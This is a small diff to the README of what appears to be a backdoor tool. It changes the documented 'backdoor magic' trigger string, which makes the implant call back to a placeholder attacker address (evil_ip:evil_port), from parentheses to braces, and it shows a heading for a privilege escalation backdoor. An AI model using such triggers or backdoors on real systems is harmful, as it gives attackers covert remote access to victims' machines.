@@ -42,7 +42,7 @@ After that you can simply send specially formatted data over any connection and 
 
 Using the default backdoor magic, that would look something like this:
 ```
-3tph0n3h0m3(evil_ip:evil_port)
+3tph0n3h0m3{evil_ip:evil_port}
 ```
 
 #### Privilege Escalation Backdoor
